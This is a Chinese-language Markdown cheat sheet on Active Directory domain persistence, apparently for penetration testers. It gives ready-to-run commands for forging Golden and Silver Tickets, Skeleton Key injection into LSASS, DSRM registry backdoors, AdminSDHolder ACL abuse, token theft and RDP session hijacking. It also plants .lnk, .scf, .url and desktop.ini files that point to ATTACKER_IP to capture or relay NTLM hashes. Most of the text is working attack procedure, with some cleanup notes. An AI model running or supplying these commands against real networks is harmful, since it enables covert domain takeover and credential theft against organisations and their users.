# 域级持久化技术

## Golden Ticket

### 原理

伪造 TGT (Ticket Granting Ticket)。拥有 krbtgt 账户的 NTLM 哈希后，可以离线生成任意用户的 TGT，默认有效期 10 年。相当于拥有域的万能钥匙。

### 获取 krbtgt 哈希 (DCSync)

```bash
# impacket - 仅提取 krbtgt
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
# 输出:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# impacket - 提取所有哈希
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc
```

```powershell
# Mimikatz DCSync
lsadump::dcsync /domain:domain.local /user:krbtgt
# 输出中 Hash NTLM 即为所需哈希
```

### 获取域 SID

```bash
# Linux
impacket-lookupsid DOMAIN/user:PASS@DC_IP | head -1
# DOMAIN\Everyone (S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX)
# 域 SID = S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX (去掉最后的 RID)

# netexec
netexec ldap DC_IP -u USER -p PASS -d DOMAIN --get-sid
```

```powershell
# Windows
whoami /user
# 域 SID = 用户 SID 去掉最后的 -RID 部分
Get-ADDomain | Select-Object DomainSID
```

### 伪造票据 (Linux)

```bash
# ticketer.py 创建 Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator

# 设置票据环境变量
export KRB5CCNAME=Administrator.ccache

# 使用票据
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
secretsdump.py -k -no-pass domain.local/Administrator@dc.domain.local
smbclient.py -k -no-pass domain.local/Administrator@dc.domain.local
wmiexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### 伪造票据 (Windows)

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt

# 验证
klist
dir \\DC\C$
```

### 跨域 Golden Ticket (/sids 参数)

```bash
# 跨林信任场景: 父域的 krbtgt + /sids 添加 Enterprise Admins SID
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-CHILD_SID -domain child.domain.local -extra-sid S-1-5-21-PARENT_SID-519 Administrator

# -extra-sid 519 = Enterprise Admins
# 票据中嵌入父域 EA 组 SID，实现跨域访问
```

```powershell
# Mimikatz 跨域
kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD_SID /krbtgt:KRBTGT_HASH /sids:S-1-5-21-PARENT_SID-519 /ptt
```

### 清理

Golden Ticket 的清理需要两次更改 krbtgt 密码，因为 AD 保留当前密码和前一次密码:

```powershell
# 第一次更改 (使旧哈希变为 "前一次密码")
# 使用 AD 管理工具重置 krbtgt 密码
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "NewPassword1!" -AsPlainText -Force)

# 等待域复制完成 (视域大小，至少等 12-24 小时)

# 第二次更改 (彻底废弃旧哈希)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "NewPassword2!" -AsPlainText -Force)
```

> **警告**: 两次更改之间必须等待完全复制，否则可能导致域认证故障。

---

## Silver Ticket

### 原理

伪造 TGS (Service Ticket) 直接访问特定服务，不需要联系域控。比 Golden Ticket 更隐蔽，但只能访问持有哈希的那个服务。

### 目标 SPN 与服务映射

| SPN 格式 | 服务 | 用途 |
|-----------|------|------|
| `cifs/HOST` | SMB/文件共享 | 文件访问、PsExec |
| `HOST/DC` | 多种服务 | PsExec、WMI、计划任务 |
| `HTTP/WEB` | Web 服务 | Web 管理面板 |
| `MSSQLSvc/DB:1433` | SQL Server | 数据库访问 |
| `WSMAN/HOST` | WinRM | 远程 PowerShell |
| `LDAP/DC` | LDAP | 目录查询、DCSync |
| `TERMSRV/HOST` | RDP | 远程桌面 |

### 获取服务账户哈希

```bash
# Kerberoasting (从域用户到服务账户哈希)
impacket-GetUserSPNs DOMAIN/user:PASS -dc-ip DC_IP -request -outputfile tgs_hashes.txt
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# 机器账户哈希 (DCSync)
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user 'TARGET_HOST$'
```

### 伪造票据 (Linux)

```bash
# 针对 CIFS (文件共享)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/target.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass target.domain.local

# 针对 LDAP (可执行 DCSync)
ticketer.py -nthash DC_MACHINE_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn ldap/dc.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass domain.local/Administrator@dc.domain.local -just-dc
```

### 伪造票据 (Windows)

```powershell
# Rubeus - 针对 CIFS
Rubeus.exe silver /service:cifs/target.domain.local /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /rc4:SERVICE_HASH /ptt

# Mimikatz - 针对 HOST (支持 PsExec)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:target.domain.local /service:HOST /rc4:SERVICE_HASH /ptt

# 验证
klist
dir \\target\C$
```

### 清理

```bash
# 更改对应服务账户密码
# 如果是机器账户，需要 reset 机器账户密码
net rpc password 'TARGET$' -U DOMAIN/admin%PASS -S DC_IP
```

---

## Skeleton Key

### 原理

在域控的 LSASS 进程中注入补丁，使所有域用户可以使用万能密码 "mimikatz" 登录，同时原密码仍然有效。仅存在于内存中，DC 重启后失效。

### 前置条件

- 域管理员权限
- SeDebugPrivilege (调试权限)
- 对 DC 的直接访问

### 注入

```powershell
# Mimikatz (在 DC 上执行)
privilege::debug
misc::skeleton
# [KDC] data
# [KDC] uDiffCSP
# Skeleton Key 注入成功
```

```bash
# 远程通过 PsExec/WMI 在 DC 上执行 Mimikatz
# SharpKatz
execute-assembly /path/to/SharpKatz.exe --Command "misc::skeleton"
```

### 使用万能密码

```bash
# SMB 登录 - 任何用户都可以用 "mimikatz" 作为密码
netexec smb DC_IP -u Administrator -p mimikatz -d domain.local
netexec smb DC_IP -u any_domain_user -p mimikatz -d domain.local

# impacket
psexec.py domain.local/Administrator:mimikatz@DC_IP
wmiexec.py domain.local/any_user:mimikatz@DC_IP

# RDP
xfreerdp /d:domain.local /u:any_user /p:mimikatz /v:DC_IP /cert-ignore
```

### 限制

- 仅在内存中，DC 重启后失效
- 如果 DC 上运行了 LSA 保护 (RunAsPPL)，需要先绕过
- 多 DC 环境需要在每台 DC 上分别注入
- 不影响已缓存的 Kerberos 票据

### 清理

```
重启域控制器即可清除 Skeleton Key。
无需其他操作，因为补丁仅存在于 LSASS 进程内存中。
```

---

## DSRM (目录服务还原模式)

### 原理

每台 DC 在安装时设置 DSRM 密码，该密码对应 DC 本地 Administrator 账户。默认情况下 DSRM 账户无法从网络登录，但修改注册表后可以启用。这提供了一个不受域密码策略影响的后门。

### 步骤 1: 获取 DSRM 密码哈希

```powershell
# 在 DC 上通过 Mimikatz 读取 SAM
privilege::debug
token::elevate
lsadump::sam
# 输出中 Administrator 的 NTLM 哈希即为 DSRM 密码哈希
# User : Administrator
# Hash NTLM: DSRM_NTLM_HASH
```

### 步骤 2: 修改注册表允许网络登录

```powershell
# 查看当前值 (默认不存在)
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

# 设置为 2: 允许在任何时候从网络登录
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
```

DsrmAdminLogonBehavior 取值:
- `0` (默认): 仅在 DSRM 模式启动时可登录
- `1`: 仅在 AD DS 服务停止时可登录
- `2`: 任何时候均可登录 (攻击者需要的值)

### 步骤 3: 使用 DSRM 哈希登录

```powershell
# Pass-the-Hash 使用 DSRM 哈希
# 注意: 域名使用 DC 的主机名 (本地账户)
sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe
```

```bash
# Linux - PTH
impacket-psexec DC_HOSTNAME/Administrator@DC_IP -hashes :DSRM_HASH
# 注意: 域部分使用 DC 主机名而非域名

# netexec
netexec smb DC_IP -u Administrator -H DSRM_HASH --local-auth
```

### 清理

```powershell
# 删除注册表项 (恢复默认行为)
Remove-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Force

# 或设置为 0
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 0
```

---

## AdminSDHolder

### 原理

AdminSDHolder 是位于 `CN=AdminSDHolder,CN=System,DC=domain,DC=local` 的特殊容器。SDProp (Security Descriptor Propagator) 进程每 60 分钟运行一次，将 AdminSDHolder 的 ACL 复制到所有受保护对象:

受保护组: Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Server Operators, Backup Operators, Print Operators 等。

攻击者将自己添加到 AdminSDHolder 的 ACL 后，SDProp 会自动将该权限传播到所有受保护组，实现持久化。

### 添加 ACL (Windows)

```powershell
# PowerView - 添加 FullControl
Import-Module PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# 更隐蔽: 仅添加 GenericWrite (足以修改组成员)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights WriteMembers

# 手动触发 SDProp (无需等 60 分钟)
Invoke-ADSDPropagation
```

### 添加 ACL (Linux)

```bash
# impacket dacledit - 添加 FullControl
impacket-dacledit -action write -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP

# bloodyAD
bloodyAD -d DOMAIN -u admin -p PASS --host DC_IP add genericAll "CN=AdminSDHolder,CN=System,DC=domain,DC=local" attacker
```

### 验证

```powershell
# 等待 60 分钟 (或手动触发 SDProp)
# 然后检查 attacker 是否对 Domain Admins 有权限
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq "ATTACKER_SID"}
```

```bash
# 验证后将自己加入 Domain Admins
net rpc group addmem "Domain Admins" attacker -U DOMAIN/attacker%PASS -S DC_IP
```

### 清理

```powershell
# 删除 AdminSDHolder 上的 ACL
Remove-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# 还需等待 SDProp 下一次运行 (60分钟) 清除传播的权限
# 或手动清除各受保护对象上的 ACL
```

```bash
# Linux
impacket-dacledit -action remove -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP
```

---

## Token 操作

### Token 模拟 (Incognito)

窃取已登录用户的访问令牌，以其身份执行操作。需要本地管理员权限。

```bash
# Meterpreter
load incognito
list_tokens -u
# Delegation Tokens Available:
#   DOMAIN\Administrator
#   DOMAIN\user01
impersonate_token "DOMAIN\\Administrator"
```

```bash
# NetExec impersonate 模块
# 枚举可用 Token
netexec smb TARGET -u ADMIN -p PASS -d DOMAIN -M impersonate

# 以指定 Token 执行命令
netexec smb TARGET -u ADMIN -p PASS -d DOMAIN -M impersonate -o TOKEN=2 EXEC=whoami
```

```powershell
# Cobalt Strike
steal_token PID
# 或创建新 Token
make_token DOMAIN\user password
# 还原
rev2self
```

### RDP Session Hijacking (tscon)

在不知道密码的情况下接管其他用户的 RDP 会话。需要 SYSTEM 权限。仅适用于 Windows Server 2016 及以下。

```powershell
# 1. 枚举会话
query user
# USERNAME         SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
# >attacker        rdp-tcp#5      2  Active          .  4/3/2024 10:00
#  admin03         rdp-tcp#3      3  Active          5  4/3/2024 09:30
#  administrator                  4  Disc            1  4/3/2024 08:00

# 2. 以 SYSTEM 权限劫持目标会话
# 方法 A: 通过服务
sc create sesshijack binPath= "cmd.exe /c tscon 3 /dest:rdp-tcp#5"
sc start sesshijack

# 方法 B: 通过 PsExec
psexec -s -i cmd.exe
tscon 3 /dest:rdp-tcp#5

# 方法 C: 通过计划任务
schtasks /create /tn hijack /tr "tscon 3 /dest:rdp-tcp#5" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn hijack
```

会话状态说明:
- `Active`: 用户正在使用 -- 可劫持 (会踢掉原用户)
- `Disc` (Disconnected): 用户已断开但会话保留 -- 可劫持 (最佳目标)

**限制**: Windows Server 2019+ 已修补，tscon 即使 SYSTEM 权限也需要密码。

### 清理

```powershell
# Token 模拟: 结束模拟
rev2self  # Cobalt Strike
# 或终止使用窃取 Token 的进程

# RDP 劫持: 删除创建的服务/任务
sc delete sesshijack
schtasks /delete /tn hijack /f
```

---

## 文件强制持久化

在可写共享中投放特制文件，利用 Windows 自动加载图标/资源的行为，当用户浏览文件夹时触发到攻击者的 SMB 连接，捕获 NTLMv2 哈希或进行中继。

### Slinky (.lnk 文件)

```bash
# 投放 (在所有可写共享创建隐藏 .lnk 文件)
netexec smb TARGET -u USER -p PASS -d DOMAIN -M slinky -o NAME=.thumbs.db SERVER=ATTACKER_IP

# 清理
netexec smb TARGET -u USER -p PASS -d DOMAIN -M slinky -o NAME=.thumbs.db SERVER=ATTACKER_IP CLEANUP=true
```

### Scuffy (.scf 文件)

```bash
netexec smb TARGET -u USER -p PASS -d DOMAIN -M scuffy -o NAME=.thumbs.scf SERVER=ATTACKER_IP
```

手动创建:
```ini
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### .url 文件

```ini
[InternetShortcut]
URL=http://intranet.company.com
WorkingDirectory=test
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1
```

### desktop.ini

```ini
[.ShellClassInfo]
IconResource=\\ATTACKER_IP\share\icon.ico
```

### 配合捕获

```bash
# Responder 捕获哈希
sudo responder -I eth0

# ntlmrelayx 中继
ntlmrelayx.py -tf targets.txt -smb2support
```

### 清理

```bash
# Slinky 自带清理
netexec smb TARGET -u USER -p PASS -d DOMAIN -M slinky -o NAME=.thumbs.db SERVER=ATTACKER_IP CLEANUP=true

# 手动删除
smbclient.py DOMAIN/USER:PASS@TARGET -c "del .thumbs.scf"
```
